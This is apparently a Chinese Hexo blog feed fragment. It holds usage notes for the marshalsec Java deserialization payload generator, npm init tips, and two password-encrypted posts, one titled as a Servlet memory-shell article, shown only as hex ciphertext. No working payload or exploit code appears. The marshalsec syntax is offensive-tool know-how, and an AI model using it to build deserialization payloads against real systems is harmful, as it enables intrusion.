        <content type="html"><![CDATA[<h1 id="marshalsec使用"><a href="#marshalsec使用" class="headerlink" title="marshalsec使用"></a>marshalsec使用</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.&lt;Marshaller&gt; [-a] [-v] [-t] [&lt;gadget_type&gt; [&lt;arguments...&gt;]]</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>-a：生成exploit下的所有payload</li><li>-t：对生成的payloads进行解码测试</li><li>-v：verbose mode, 展示生成的payloads</li><li>gadget_type：指定使用的payload</li><li>arguments: payload运行时使用的参数</li><li>marshalsec.<marshaller>：指定exploits，根目录下的java文件名</marshaller></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/npm%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/11/10/npm%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h2><p>当我们没有项目的时候需要通过<code>npm -init</code>来部署一个项目</p><p><a href="https://www.cnblogs.com/WD-NewDemo/p/11141384.html">使用“npm init”初始化项目</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package name:                      你的项目名字叫啥</span><br><span class="line">version:                          版本号</span><br><span class="line">description:                       对项目的描述</span><br><span class="line">entry point:                      项目的入口文件（一般你要用那个js文件作为node服务，就填写那个文件）</span><br><span class="line">test command:                     项目启动的时候要用什么命令来执行脚本文件（默认为node app.js）</span><br><span class="line">git repository:                    如果你要将项目上传到git中的话，那么就需要填写git的仓库地址（这里就不写地址了）</span><br><span class="line">keywirds：                       项目关键字（我也不知道有啥用，所以我就不写了）</span><br><span class="line">author:                         作者的名字（也就是你叫啥名字）</span><br><span class="line">license:                        发行项目需要的证书（这里也就自己玩玩，就不写了）</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/controllerha/article/details/84256852">npm安装报错npm ERR! Refusing to install package with name “xxxx” under a packagexxxx</a></p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>检查package.json下的name字段是不是项目名字和你安装的那个包名字相同了，如果一样就会报那个错，把项目名字改成和你安装不冲突的名字</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Servlet内存马</title>
      <link href="/2021/10/10/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2021/10/10/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="bb0024cd678aaf502a8c94058244411218ea6b08e06ab8c0f7c507db220a8c35">bd25ed9264b080267271e137e33d0ce118960a041ac35a180347d4bc9710c7dc719dea92a126b0297170621317daafbdffbf31a035cfd7549f66ec1c8dac7bee053ef79b6b56a698f650e2c618d6594dddfbb8ec2059d4671303cc310d2be96f23272feea78551ec5b1665b02aff5e19f78145feadce5a308f33c8e5fa4e7958eb8a756050f1844e1898cba0541c7a702b8ac3dae9969422bde6fa3a36f7ce40fbadc96c77d580ab974d9505fc0c80d5b50fcebe39b3c110fbe9d1931a036098be5a369dca556fb0bb555569a5828108efa3803698c8d1ad3fe7de60bc3b357c00e3973a949ed8817fd91b5415bee61f0ff200a563600ee7200fa7e630887ebc8f0d85c0355dc3304fd0ace64c71df73f8dd85ad531775c1075a373c2532842fdfd264cc197677d22349f30c8cb3e3d0cf79cca291635fb31304af018994c0f54cd60020fa0e32b84578cc444165ff54b36bb292b50e8fd70b793d2c44246645e625bae872359a52a6ac080cc048b6c394268d038fdfca61f8a953cfe2e6e4db52c32f6cc31c81e3e93ea6cb722277de22abbc1f27b8785b3599b264e575e891e82bcc122568bad1f5a7a609aced7313a80b8700de9f8e87810743f3a5a5938a189f1fe7e16593e01a8b37563eda0394f0d62a93f56458a24e69c0e9f2ff153b161869349653ebec0dae98de622b1ce9e5d332dfced00b8d3e8863e971b989d2ac3d233219799f263a3ecdd6da2d99948bae997d09a10f47dfa73771df08ba8f14c25365f9c6553e2900bda188ad1b67bad94554f2200f266d155364fc6f57d0ccd85eaec5cd1c6d258e95c3a90eb029c7126c859c033246ce6b15caf21752509c5fb0337f468ca0455c358bc2090811b5e6439d9869afe0771f35f335e705d98f4513c79139a84d472becdd1ff8093af826007ab771a36eaf47fa97b14c728056eca983225778b14db7826dc4d2f9f6b7b748f89c1418848ec4fee5b689d90bf4ee7b46d3cddfaf3c1a5812e734508861c891f31db74ad4d8b61718850ca162702924eb70a487b23c87a87546b9ffed1bab759daa5335bfc55140efbe71840676413531980a0e2e744ea90b35aa394e138b30a638f231b1e5eb9b2ff24b0326bb954cb7fa37bd808023172c295a2ea62463903776cfee169dd0b84d0a5665295f2ce8ff7c0faa1d5f7d9fea07b5b915c5ec3a3dc4245ec81f3001fd46d2d702c5afc8284d960886a11b4db035b5120daa17c903dfb1d5ed2592652116cbe046f97dfb7427eec2bf8269ec8f6f821e8d901fbcbf4f9a79ef9fb60fb5734d920739d48374d25f8d626d8a8b9e21e21e8ce4c6cb0d70ef4312bb43a65ca0a6ac4609bc282532cd554f4d06b636058b072622eb9be9bc948bbb50105fca9b3e3926e164acf7e21bbd0323edd39d39196c96bdded8bc10f027807bb1d0fea74492681c72a3765f4b7bccbf500d583b7f9a20d05dca91eaf0461b8ab1324f7cf699dd0c9c6f727d8b066a422edfb3a54d42c0a20e6a662f01a6b60e4fa1734b2dd02d240acfa281783800a91d70881a5ee2d769994eb8da03e3f590014700ba0b5e33cd6e962376b649a1af110328237a0c7ab45f096581dabe1cbbf2e7689cae14cda03c28cf06b310bcefe8142ad307acb51b45d571be20b316849be94c3d2ec963af54c27dc1c9777a19a5aacedc01e8b9c3991c8d91b0e9400756c9ebcea599936486d606962bffad7febcace8edef61b60ee7faf4b507b690a9cf54c138aa18593ba093d21c2bb6f2783761e117e1a753c5fb6c25e9b9e68e11800c12e962eadf36ab01fa230aad5973cb3e722851545819fd9c7c2f16351ebd58b8492b365dc72b13e465ea112650e2b4937db2743c807126fc95bb78fa7f8cbbbdb95dae63a40b7f70464135fb4e9370235e739c09a161b8d4e29e1d84ca98eee2814d1768b04012d87c9eb3cb9a9d2ae416b4db16790069f94ca18837f4bd4c6a92480ffe7dab48d987f81ae93fa0fe5e525b04382e475eb38bc40b24e9b4ffb2f58f6a74bbc090d0a2d5222078474cb340757c002098c1264d041a4ffeb78a517c6f6ab958f13a2b0aba9fd4e921a8dede471e0bdc44c1791e544d4e3d1da28bac7ddffc64f90ca7d3d9b0f8c55c23e3bb3ad1b5d61c0e04de2a5ff843e0ecaa0abeb731106349b69977e51920140f4164dae5839332466118ef20f3965a60b3cdc12feb11d8387305d82c75576f0fc15219610592ad063523abfbd0d899e4804567d067afbe2b284e19160ee057cb8bdf2bc46af864fd624472cf75bc04a35585f8dbe1883fcf11da104baa3684b03e7baf4b122e41474415aa41ce08fb2152f6995727f309d377c1e5cad1aa5d091d24cdc589b30de4709907a60ad931d5c5576e5826c344620802a56409a733b28ffbed5b5f0f9f1a32e1ae29ca4bdcc369ef217275057d0df394099e886dfe5503a365e53a6ccb92f8446667ff01cea4b1d40e6cfe6ea73bd83cbc481e5566834aeca1cb510eef346b7fdfddb03e98ae47d6089154d4b8bc624c4ddc20431501fa79437af865c1fbdd06d3f226df9b82d9b93c70ac54df3d42e2dcae10fc2317b65c878172ed3289793b1193002d5aabaf53aa4198807fd6b373c83c8d0f73341c140247b8e806a50e097861fe23d80268247bfef26a90a71edb22e3d728c135c0c97a7a3294145510ef534c802c2a9eda6b0a6a436120dfd37b202b99d5ed63947d1ccb6959aa97452ab217da9c972bd8415b61892f64577555c327969f928fe62a4bd6d1d4b3803d408d4ca008d8e908b0cace50a4784114c2c486353e58db7f94f03ca5120b20b34d276e698c597afc57c5278298f53d6ea2217e2645e630415faf2b102dd2e1d59d08417726078bacd49ba7c05ca4850c71e58fc394ae3f1694407020d507d5372d37a92977bf0852807f7f56a43cffb8d1c168c5510847e99f2b710a1d713dcda2dfd98e88ef863fc7e0ece758c7764669174f1455600ebe3f8c151c3c20163217bd1881a78a845c0afdc82e4bfafc4092da98a71cfebab337fe911ec529ff9004301e318f0e3daa262bc1f2ce60e4a319d7fc51a0001e0ff5ba6f95f34f6310ab0ddb6d6a6044ef506973fad47fbf65db2c86d669e848f621959621c92571bfb3b2dc126de646ced57284534cf2b43966e924a76c8bbfdd4e4a307852ba1ca7f69bc861b246b1dfe04561ed85bf19695d02d87e2e128f769b397fde0f8d45ecabe08285287b832eac4bcb27f673ebd1b061294f4ec0fcf9613ef0f98c648bc87f4c607e619e34ac61a88df9515582d3380c9c6857685010c8ddcae1c8e445ae8f694e75712919630d23432d13368b3803b041a5492db62321428e0348e5732cb13893af2c908dcb8ae94860b9925523af28328297793ae4787ce03d19c28ba2f4c0b147e84f3e7147a62026b3eab696fb3885d01742c3856989872726d7a1845d92387b6aa3f7fc2d62e792860de3404e5376482ff4f08dc2d212a3cdf23e899648dde5cc9524de6070fd78830841b42ab731808082bbc17a531dc176138d2c5999a2b1b2a279a2b979f3c478c22b14b77beceef1cb4391f2bb301159029d56ea8076ca6be5fe8c394c6ba28feaf03ab95463e4d12babb99873e9bcd96965af48721c08bc0478364550ee86651c66a6c9934681e9fb2145d47428afb729151a205e7367998004070d1ef451ea87152ce49fcebf78f45a6de45b93ce12e6e2e0847ff84cd2ccd1c3f51477573ebc67178da7a74936e97733b0e78d86d6666929d491f6597c4dfe4b943719421c03513a38231ef014f4e0ae7af9577128bd5c5044b04422c7208520d1c021cad7014a0ef510222af3a816dcdaafe47d0b23af950902a4e367dc430166ecb6e090511df03793fa55427143a791f18ed58f0a0aae51cbc6b142b3dae02d6bf0a88d2a8e2761a103aa24052e83af54d49c392a31a31920160e028a040361db343bc9ddba7b4cba30c5e408279b25b2e42f159bf0ed04b428369038a1a388946ad24a4f1ca13aadc7a8a55ccd7b553a9dbd433aa41bdede12c3492c60ac58228fb2e6d4cf8b5b34572cd4029cd357ceca0d77c46143cada3a870130082545899fc6118e298f9fd3229bec81b4c66dc646dcab93844d3ce711d364fad17b1fbba1bc0d1ca37ae1d5c93afe9974df2b6bc88a0d04f530321a98526cd1ac5a721606bf022dfd1b29414a3aa2b0e680af2a511233c7a9889d36377680b6cfa52c9a5bb614b62d63c4a7ebc2865573b4eec91c11059fa39ff36afd7ebf51858d994395de9973799e5a154a13dad323aa7de01585c39a56f9f2ac23d64f3bdfe9fcfeb54d39d7b37a32a5a9b9154cc48c5ed676fbb43c938fa13e54c83e9c4d1341fed9ead6bb115b8ff58eb80510bd94da7846d98307dffefd51bd2600ff4c973c8248eaf03bc02e824dcda8f8cfed87fc005bd43b98c9d62b3a8fa19135352303ef83fdc060293d1f036caf00d65a1f76650902e0bbbc5f9d82c581519a0299320e2ec060901c51085097573b6d21668f70814d983f79ab36acda909f741923102cdb6c1c8dc9e8d1d8e01d61199769c520ef9d24d4a5adddafabf5bb4cbc674441680e43e62f52f0cc136213a1c9b691840719d7e39dbdc64c7a39151bb72d444417671086f9ae83756cbea12aee619d9d0ff9a276bfc3d98b978e19d2c875ff1290264a1ef97e7fc401c102f787a583b1b56ce66c5d3a52cceff42b678f8d0e28462c23f41d500c598b72e02d1697f2b2565f549f39283f5ec34889d5b3f689057bf01c5a08af1e8f635615ab66947bbc79c6f79f0c65a8be724423d81a2fe6df45d37b960441815858168fb7069f1e09e916930dc714cc36cca3f45356ffcbeac4055a78dec2bd155263b889f7c031de9a0cb665e0f34403a327b9cf70645c5d34fdfec24ec56d85538dfa92dfcff6c3bb5e66397f5f8fa078f508afb630143ac805cd0a899205e111cbc138b4d3b7d72317cc2bbae56da9bfa65e4c4d2aab5895cf6a6a32cb8b413ed847f6055a21406298dc06e945d845e98b6e1f6994523f63f1f542c47b3de9b89ac3da702f8c0becda596554188262efd5a624da8f9f1e9a8898e83e5924726b3d5805ce9447366de427457e3d08fb3a9cd8bb1d3071c2aefc45e989a28d450c06f88fdfd75c8aea9655ab654c29d3921bf46da82e9dd53f323484dd1e4c1f776214a5ef03117c9bebd4966249dc774a2a73af4b7440bff99d428b2782b57fce4b26679a0f7977099080193b594d808ea4af3f121fd49b39017fd6d2f10f3449e41530176677b8d0468fa69cbc3fa34181194f66a9fdd87b471b3aa09c39b87e5f398641784faa23f8104b23be23350a7ca52c068fb91c59875103a72ae3b1cc5a6f1619d5a7018deedba3d2fc4275dd9c316d0325f6ebbf518e147d380836563dd766a5826d368b7fb4b870a3c4cc5b2aba38f9dc5bd2dedd3d135a675738fd85fb2e35aab532dfe23594fc60456828bebf29f2ebec0f773485e88a2f99e80bc0596e9e0499b0c7528d26fcd63c534b58c1b2f2d107fbd29404fd6ef7cc7e373ee6fe12aaf5aa8503486354a1868d7e8ed863677a364d4a583258ad851c018c562f26ee4b3e0ead430b1005619adb22296971315a958c71e72966ef494634fcd0b467047783d04f1cf6a13ec8aa5b89de41217c42923a1e8e83bc5e721aac37a6c43bcc087db6c691541456021ffef0d68744948554a89d9ca73c12293a5c52fa6d34c9d18ad08289820b0da88628c819fc5da7436402a152cc60421f4770f979ad641d5e2ec239b0408c7625bc40f746b6d62eabadc0b14160e20f84231ae45ddbd15ef7cafd672b1ec4051b49645cf2997c3ca13336235a273bc5a5002280fa1fb9610f3b96a03b299038bd9c186eac2bc52827f65836a92de0d59941581d667c54c9eece168b39d51417263180188bfefb9408368d75851db9ea57b81448a42c0602b2c7d75fb73baaa56599f3f99ee68a00861ecbe61de40f37735fdbc9f5210c95823f49c09a846f3b3b22d01968ecbbc17daa9f1965073a464c5df6684d7f581c22135059a6af929ea9cd2d31735edc6b807c8de7a0d2220865cabc21e129ec63f2578f04478e0b176bdc5060d0bb8b07f6b55fa092275e1772aee7c12eba86783e5bf973362bafe390e23807ecd01c3e19bdec1562e8ac0ad7011070427127e13705e8943b56d4f5e15809035375bb003ace97c382400370ad6f4cc7113b534e39284ebd21151a57ad5d56883404bc22fa8fe7359aea6d6d5ced5c53cb1ed51fe0e09087841f00f757412d97d09acd45a5fe6792d914b1d65dc293087cca5804c3a1ce4a213c44e12e19d17f581217f21b4c2199fbd0be18fa6ab82d1ac632d1d209e9058551669365b60c4c5141be1f31432fb5cbb6ef44f6250a40d0e69d0e795977c83ff827128c6ee9d4403d197b23d46bcceb4c086a8f8334cc423e6530a0ff1ebf4ae93a0094d41e91736ebaf9618929da2c6bb1c2567ae8de71109054d0544d1c3a35cdcbe9fa6fe43e93b4d32464fdf23c6846da5c71a244a9005a0225298d9938392fbcd7788ad58f581ae73666babd5d38b9beb3eae68a9fc7773f9e5f71f63ce15955e82b39ec286d556aa6c9def3629fe125c35636504cdbf963569443e7f5ab0f3a387727cc8ad1e28238449bca420dd93bd0e8586464eb0fe041b993aa1351eea89cd542f6fea9196a68808c1b048d6f5a1a9a8e2aff5d9af8df1aed561af6711d2af9f58be68405f6bcee1ea12df8236ffe1a4bd488a5dadc574a3ca87d5e8f275deb9e14e20e4ee3c1f88d9dc03ca7263e7244c17e5922cbd6aa28e941c44d37ad9d430c6b7970a2c1b1705df0f2e472659bf558a0786d75d9916e639f03764f88492d1a2c32886ebedf45bfa305fab7e0be50d04a04d0a0af4486ab0f25606de735abffd6cb4be20df24a98d051342443eb7cb4a7c7c41a54bb19204bf73017aba5a45dc976a38c92801decbaf609074a3d7a87c79ae24ba9cab0a362782d1492434c498d7e7fd0e63e66bcba55f2af3970014e759fc1b9694b66f14cf3b232aa1c047c625d82dd357a8f0ddc2eee142d80d10d4ca0608e0fe85c612a3560bfb1610f0a2af805004e3a14442925ed55cae09f6648fbf209e98f0c67acf8a078b41d69059012ffe13ccff793074479eefaacfc91f9152ab29f04a52058d84beb4a0109b3af204a960a38c3719855713d12a4a1c6b87bb27b7018b2699db702b0b81e70e58914ba68e045225822f1f2365921671618bb0214631b059ba118c6deac13c931dda03339b0027df85748f48cd9b9f6916072a2be65c58c8d5c9387881f1d43652f74ac21ab2665af1411089862fa18993b6a11e3db3fd301f9f834f57ca5911af93c9380a4004a204cedd00891fc050a131a3246a7375215d3d396ad6d7d223cf0b89f9db9ff117f7dedfec4194fa739cdfb6f97be5c204a9f75a721a3e1290b0c7ee412f6159f42795bbaf387f67aae3c9328bbdda10d1ea45b15e97cc0df3b9fba43715a515f01eb34435c8e6afc0811da4963df8c94fe0e596fdd38f0b744f4b0d4d6569b01072668108e1174b6e9349747921267805aebbba4ae9dcf8b2a3461227ac41b323790be6c9c1d1d09246f9827a1b218609f4593dab43296c7b2eba618f15bc260b1f9a693d6460aa4005f3e5024e3cd1015cff0a6393859c2262e0c53a285b53a5b2277ab25dcb43039ddea039191806a3d6f3c62b1b6f7f6378c24c60f7e9dcb9bdcf3064882e1dd3cc14f317818c97ec443db922eab283a270488849fc6a332ad3f2066b91dfaa4bf29cd4a1464f3f34e357252b6102e34c30aa559491fdfc55b997c1424e81b9b136cdfae53051be912a65139e9b4c87b685c9f09eb38fb6c5ce49b8aa7ac02ca8ad96ed761640201fe0cedf9fec97628ffca102ab27ce2e900200772c111d157a8d9fd6aeb3627d3526ca3e8ee53f58179a9fa3255557b55628d62ce69577743c1c3676f395c9924a56523fec8a9d90cf8df63348daf2fc283bd5cf36d2cac4670b80345572e942d88812396f25badb2f3c9364167470097fc158ad44d7993f5acf305bb4902f085c131cfeebc50fd23401b5b139a75e0f180e0e5ff481746a3e37fa1a392c657c8f68c9f3115361e89cfb9badd6b324291389c4825c0b87c0480c42a57ec8fadbc3e740a2c1065d5af748dbe0c1791ffb5a3c89c447517e9e211b37b193a734e1536b52e63c0012ea9f5ef1e821968129bfec51d4a8d442bd00d253eca9819b646f065569a27ef7d905e4292f0bfac36990b55a185218d72a7b2f30b6f42c9e1664c00b04346e758a90f9f2d4af7ace3977a46501fd82b253dd700764a6d833486c6af82f7fc95117da836f3f1744b11fc89847505783ac20ed7828f9aca9751ec9743f1603a15513eb761306656ceb7d3a81e832018b919ec797d4224876b1005b75ffecca6265596ce23bed7124a6d5a6497e63f664bf4541957f77f294b491dc57bfe949ebe47575ad31572a88e8185acb0025a0824addf3cf9f3bdc6ccc0e3d1a72d3b891da7dad46195471afdd88487c9529ed5ab8856739eb82b1a10b6ae2ef6f60623295f4c2293e9ac793afd78dd8da6a431c61923a2cb66bfefc31e0db3f3d20e3f2a0543b4a8c26d21483911ec21ab520468b9b9dc115a53950a0b5165a970e418a04cff27074f4ce803589443a9b7f982b228562db5d6ed6177b0a979bd81daf815048d0bc03fd1c363bec34d701dc502b8af80bbbd90be5d168c05439c4cc5ac40fed85013079079e3fc726b516a00747dfe5555b79dcdafd704047f1cdc3375b751f69978ce4840e797b9ba6f5664753acb598ce2388248d4a109ad34b2cf7488c2148b123f5bd5433980245c345f8490efff3a401d3e48b00185ef14f693927acb0674aa4e42f71d77915cddb1fe44079c74a29071433f2d793dcc1bf5772d4df527d0c3de78a6451fe5ed0e04c258139fb9030b73f2a88ed8038b7574972b972099d1118130f85b0bf4470785cab06018e6339ef768a0e02d864d30cef9a9eb060b51022f8ea2559fdfe7bc650d4085f5566fc2f144f6ad8ebb96e7d4705c31abf9acf83eb4c6bb8e51a45572a85121e9a5db61b9354f86f68b6d4b67c9147a42f9b7898e3dd2ef634e6387fcebf1d7d178e1a55cca54b0aa72eb1fca3e356a068b4ad8f98e74611ef71c4aa477f740f620095cdec936c6b972eb996079c4bd39a9bc8ad8705a7099771921cb50b65f9ca8b215b41289ae0200dcfbe5372e7f7301ee8d5981cd49527c36385f61d1bcbe98f20ff12aab63bd5f8e4581d47783682d485a0067f06443ac2b7ea828e9de15dfc7dfa6ff0bf1ab9d82a31a55949b4969e5e80917da3994f45c356aa5c77be950ca85aac1b7414f180370166200a726f2e0b160c556b5184d118563fbed73576eb58396e2c4221dd90b28d37bb786d3ed0ef2730d540cb1aacc6dd81fab5f0e309646d6048faeb3d836e7ebc17d18b652c5f374b5a668cb595dde6f2760fdfa87c07f96b2a816575290a9e75f3d4c59e03806dfaa57971bbaec3a296a0138eacf20ad4496673653c1fb42f860ee14ceb9e9a404e7f98d8e1cb400d95fe79dc61bf8855fddb0004b604d6a45d68c787d9751930e8a5bf74818ff4b2c2425c920f12ed9c4b66ee77995443258c7f7bd652c74e30da71d0bc43c9d3dd40a18bc2338cbaa5fce95b6e4bef3c6766e1b482a478b9313b0368918fdf79f5e12de10bf2872392074e0b4b7ecf494886a435475832f7e75db7206703db8cfe1b469d06577d6c601449dd141ff3bf6327291b1df014077d64c68dcff80e5229b23982474ee7d35fcc135adc9d9383f90ddda0df9fdfcfbef626fa2b485f797e807012c8cef280805a562f9b1b68a7e1b7639a8c8e694e679e6284e32b3d60f73bbe859a30e1fc4f955ccfa2bd63335f87cd275619ed170c3a6fbcc8f4d8107cd4de6ebc8b29b000131761fb6eb9eee658986fc3d907a8e9bb6aaf144820e01707dbc10dbaf5d931e134e9772e94a24f4bfca0613b471de3bf862437ea73f24d0bcc47f62e7c0148b7e11e779018e80556ffcee4fc27e52c402ed85067dc090f403acd4e857a235ec5b3e24e5bd4861b4e7f2eb532b100543e54c7e1f8500f5352b24c131d267b43a008d0def67b62cb2b52cc92a9913e5a495bed8334aec7c57ce3eefbbf642396a0f7304cac5bbc350e15ffacf8f0004e1f74eadeee69afdb4850840fd5a5d063cd73c9b85301dade9b8aab6bc049c3a62505284d5745b6241cc400345518e8009d1d33950fa352a65e10da1859a8bcf3a1543b9b413c710c1544ac732b3477dc42684b606b9d0ff9ba9e4f628ff6d6f9253ece6df406b9fa75ed779ee73184a89f33ce24e0bd54e378f0aaa66045e277191519a7d36abd17bfcdeabd68ee5e1a3301aefba923cb5068bb9a0a4aeda46efc5cd983a2b83a271d6998f511e08b9b98ffcef457b6d9c1782c598678a4c011f6285b293ede8ae808a2d9601b0723ea7fa810e4be596b55f840e465b7e5de02692bf3f63119c8e32e5468aa51e6f68dd85dc0448f145f7f68732c11d62d09331ac582d171c8896f890ce0df51a2b0d341925e0dded63600428d5388abc3ff8986c204cb1346080d0e6d0999bdcdfa46cdb215eafc2dbd415d8e852fac80d96ddb7d1aa15b73431df90fc07a20fadf9434b0890fc0be3ded2b08c7ec0c0fe26418208b9a0ba3816fc3baea718f0fc7e248d1f3400ae79a6efb3265ffef6054f0f89f340ebed793ce554d9fd05abb935ef8c5ebf108135fce82c34ef57871e4e9c148c0357a27bd06fe9dd30473b8251657c385965d2e52192e65bff8ba12edd5867c12e534efc3f724a0042c506a41379612606f22d095285611fc41d86a2b1d03b59668e4d19535649db884e0447a63a1a7fc0c01ab50bac74fe43aca5ea0763037c57fa1aff17855c0a7655ddfe992ee7cd9b0386d85dda42cd98c2a81ae1bd7b6ec5d84a918e22eb00ee5735b56597b070f8b6ac31a44e1ad2f7474cab8a69f4c6d0238e2e3a1e4bbcb6adea2893750f7d339de5b8d585bc3188fe81df2e1ce33b7f156c2de812ac3f00a6b17e36d77d0e79679006adf8bbbfcdef04a2c61bad2b252e956937ec50cc50b98a904d67beaa61c308bc029189a573f3e86584c8ec4cbc957196e446fb76216bf64265536c7760d2acb5c11be31c9c72b8ffb14d619f730631aeb1e3d044c1cf3fad7e2c3b088502ae0a031086ccc66a54ef8d6d527185856fae13a3acc87ad81bae72097a2b586e56b4d0054644ccf00b03c1230b8e1777ce2b5ad078f79227b90262d4d896aaaa1fae0e040a9a2ae7bb3a5a124eab665d24272635b9f2ea25958c56856df60a60274c89f1eea176cb6827a648b188fc9d33cebfca5c9563973fb8cad6e4f9e1e41188df50b036431c4df17119624694145770b6349b4c88eaa0c9893554bb596069017681e6f03f1f2259a0d03c7cf98c9d5001c04384388e76e97eb098ffd3d38beb0e4136de89ca13b613d5cdfc3fc23a3a632d745c83ea746ffe885611d7b3dc68034</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Java内存马 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>c语言能实现agent_!</title>
      <link href="/2021/10/10/c%E8%AF%AD%E8%A8%80%E8%83%BD%E5%AE%9E%E7%8E%B0agent_!/"/>
      <url>/2021/10/10/c%E8%AF%AD%E8%A8%80%E8%83%BD%E5%AE%9E%E7%8E%B0agent_!/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6a95cb890ff08166bf6516c96bdb9f7dd7cefa59015a3a2ae697ebdbd75ac4f4">bd25ed9264b080267271e137e33d0ce118960a041ac35a180347d4bc9710c7dc87277675184ad07eebdb245ebf3b512e6ad33c5bfffd3d21b79bbace06e9715959956a7f32262d7640a5020691d2d897ef4c81e77e7a8107944e1bf66dbb368927821f8b9f824fd1aa0379e66d21c46d95d1e66c54dd468c72cbc67ba8a53832901215729a860c9b65563acc25c93bc8ebf95c4c963bb3501eba7f0e42fcfa0ccdf0a102bd221d349e0a07b39de90d8546b23d00d5fb1b8f609812074f96b291c3a1e41b19908700b80147110e8497a3f7e3f706417511c7c6bfe3d0bccac6af5728292d571deef21d2650f4c0639598a57582fbda3a3c78c87157430a75f62715638f7257e6e819afcac47f4553dca2bba598c53647fad46467409ff9f3567b46bb7696e7b8e14c173004a36e8e8f1973362719b27c047f5182064c45e958098c199dec2fe836e29116d877a3335b0f9bdeecacaa7bc7ec2c297e987ab426e1b4aed84e4ea3d5471a8ca052d2377972ed28bf93d1b0b0a379e5d59dcae120b843beb334ff588ab65da41f598359c8de3496e515635955578356eda879c6bcead3202f80bbcf2265b97c61b3235f3c560d02e6d7c02e0bca4236cd50648c6774d7805ecbc71dec4189fbbc5b63bcb80f7b35400a4b0c949541b105c51f477fa2307cefae5a5778f7a4c92e9f5ed55443ee15bc11ed16b6029ee0c63b58714beafc74f9f3ac5989d5ffe4a57c5d136e793e6a694a3172cfb51c3ed880d8dd7c37ee234a9be1ebce98becd06ca798d7a7917f6d1b47a161672dd6bc9edecd74f45e7fd93722925e01b0b167b101af77d3a557171657f9e6874ca5797e24bba2f8f3e20dbe0f384358b3bc4bd6ee0a09ea77e0fc19ad76224f64736a485ca3ae68cf8736d8e22d3c43dc6617f51ea038381387e2b336e92c93482bcd181fcaca6fafe827fa54e48092c1d3a3edfa27cca9c95a0ebbacfd650c9db14d1f7b6354a4c7c9b85f4f45afe21f26a5b0847cbb765fe1776671c63b925c97bd7de16c2391e190d60e0af86e5c404d4bb1a5a3c1dced68b8d6fe3bdd3c6c5d542f10786635fb4215f06e5efdec6cb51d6d79ac47b40697b5aa57f77c9018dc23fd337b5ea18a9978daede43e98093c78a7bdfe5f3b2b985052c8b072181a63c35d65780b83ae0adb117360d0514f3b1fd8e39e6cd0c4d759d1edddfa1bd717a46da8c5f24a4e3d4ea7c043fcb81d005b36696ccc1a0a5fc0c61d6d9b94dee66a33d4bad51f3c8dff23e820fdb57af40a921bcf459924181114a98e49debbca6df2012f410b90497054bab4c8ca46910360baa474a460e8121917b34cfccf32b8474420fb2e3e9ccc437a517d88d913fd1ba37a9c0d5786b163566a60862fbcc2502f5a51fd70533e3c3d9c18fed7c078fcab6c16bb1527e03d08b91f6215a36f361d7de7c0ea1a33eace13d6c4fb2abe6ffa5c875ab6d8e41b2fa6ba26d26c9307035f39cf3b4a49d68e06b0d8c9fa0ef0bf1a89cbef66a741f79b2346c4fb2dad6fc90075c6a0491ef51d08038808880b04fc27b9f389d808f11b8e48d1bb70888b3c1fcf5fcbdf733b1c6f83cc9a583533cc6da6812d2d43020abf1461f9214218ac7a1e0812e57b2c9157eb637551038e2f6342590339a8808e8d139c47ecc8cf77009fcdda99bca85ab2e6670ba6da29863f51d80cc45cc331951abf9c9f593c1f260c4fab3eb3ff8f4217ecabf60962caeb562d3f94ba4fb4d8a3124d11f6c2e61f4750d90bef58d1f1f6effb33917ce4b20c6fe1faaf937d00489c22b35f6c1b16770bdee949a9eb6c0657edc80a471f9f76df5decfa1600f70483195fbbef3bb2aee188f369a74b6ea9c3fc070ba045e35886998efe3e0778eab1ada9cae94dc4bbb5d9c0117073b82cd72912fccf1986f416aeab570f8aed73e24534036865c06cb41b338228a4d9589a293a39da11ab533c28e10a5cc99a68b2a13af4c72e62ba3054eb735ab1d7c73bbca7f5e0f463629c556cb860900f1b2855ba8ea425fa82859a46980dd6f3b26aefd7621972f1379354940ed0f520379e3aa9815a676e7855b2bbb0dcbe5ae1bd4e55106421e56821041dcbfeaaa593a5429ae72df2cbf7f1be555148f48477e5402064eb370634cb9e439f866cd53f6ad87be6a22b6425c062895a9f9fe66ca19b839ebfb3e3ef1d6a02884bda849eec675c718b3560fa86f6bd802e7b3e29292fcfde2707f8f0213cf3b09ed0c7f0fea74f3b0e7136742a7e6b60d5c56643a2808d807ce1df5320cac937cb0970d839da1b82b2d5